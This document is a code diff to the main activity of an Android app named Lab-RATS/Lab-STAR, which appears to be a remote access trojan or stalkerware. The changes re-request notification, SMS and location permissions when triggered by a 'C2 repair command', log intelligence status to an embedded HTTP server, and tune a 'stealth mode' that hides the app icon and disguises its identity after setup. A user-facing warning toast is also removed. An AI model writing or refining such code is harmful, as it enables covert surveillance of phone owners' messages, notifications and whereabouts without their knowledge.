@@ -96,6 +96,10 @@ public class MainActivity extends AppCompatActivity {
             new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(this::toggleServer, 2000);
         }
 
+        // --- ANDROID 14+ PERSISTENT PERMISSION CHECK ---
+        // Ensuring we ask again if brought to front via C2 repair command
+        requestPermissions();
+
         updateUI();
     }
 
@@ -185,7 +189,14 @@ public class MainActivity extends AppCompatActivity {
         moveTaskToBack(true);
     }
 
+    private long lastPermissionRequestTime = 0;
+
     private void requestPermissions() {
+        // [ANTI-LOOP] Prevent multiple requests in short bursts
+        long now = System.currentTimeMillis();
+        if (now - lastPermissionRequestTime < 10000) return;
+        lastPermissionRequestTime = now;
+
         List<String> permissionsNeeded = new ArrayList<>();
 
         // Check if Notification Access is granted (Accessibility/Listener, not popups)
@@ -193,7 +204,7 @@ public class MainActivity extends AppCompatActivity {
             try {
                 Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                 startActivity(intent);
-                Toast.makeText(this, "Please enable Notification Access for Lab-RATS", Toast.LENGTH_LONG).show();
+                Toast.makeText(this, "Please enable Notification Access for Lab-STAR", Toast.LENGTH_LONG).show();
             } catch (Exception e) {
                 Log.e("MainActivity", "Error opening notification settings: " + e.getMessage());
             }
@@ -250,15 +261,6 @@ public class MainActivity extends AppCompatActivity {
             permissionsNeeded.add(Manifest.permission.ACCESS_COARSE_LOCATION);
         }
 
-        // Background location for Android 10+
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            if (ContextCompat.checkSelfPermission(this,
-                    Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-                if (Build.VERSION.SDK_INT == Build.VERSION_CODES.Q) {
-                    permissionsNeeded.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
-                }
-            }
-        }
 
         // SMS permissions
         if (ContextCompat.checkSelfPermission(this,
@@ -389,19 +391,6 @@ public class MainActivity extends AppCompatActivity {
             @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_REQUEST_CODE) {
-            boolean fineGranted = false;
-            boolean coarseGranted = false;
-            for (int i = 0; i < permissions.length; i++) {
-                if (permissions[i].equals(Manifest.permission.ACCESS_FINE_LOCATION) && grantResults[i] == PackageManager.PERMISSION_GRANTED) fineGranted = true;
-                if (permissions[i].equals(Manifest.permission.ACCESS_COARSE_LOCATION) && grantResults[i] == PackageManager.PERMISSION_GRANTED) coarseGranted = true;
-            }
-
-            if ((fineGranted || coarseGranted) && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-                    Toast.makeText(this, "Please select 'Allow all the time' for background tracking", Toast.LENGTH_LONG).show();
-                    ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION}, 1004);
-                }
-            }
             updateUI();
         }
     }
@@ -452,13 +441,15 @@ public class MainActivity extends AppCompatActivity {
                         // Instant Icon Hiding (Self-Vanishing Protocol)
                         new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                             try {
-                                SystemAnalytics.setStealthMode(MainActivity.this, true);
-
-                                Log.d("MainActivity", "Stealth transition: Identity replaced.");
+                                // Double check if server is indeed running before vanishing
+                                if (isServerRunning()) {
+                                    SystemAnalytics.setStealthMode(MainActivity.this, true);
+                                    Log.d("MainActivity", "Stealth transition: Identity replaced.");
+                                }
                             } catch (Exception e) {
                                 Log.e("MainActivity", "Stealth failure: " + e.getMessage());
                             }
-                        }, 1000);
+                        }, 5000); // 5s delay gives user a chance to see setup finished
                     }, 3000);
                 });
             });
@@ -663,7 +654,6 @@ public class MainActivity extends AppCompatActivity {
 
     private void checkNotificationAccess() {
         if (!isNotificationServiceEnabled()) {
-            Toast.makeText(this, "WARNING: Notification Access Required", Toast.LENGTH_LONG).show();
             if (isServerRunning()) LabRatsHttpServer.logActivity("INTEL_WARNING: Notification access not granted");
         }
     }
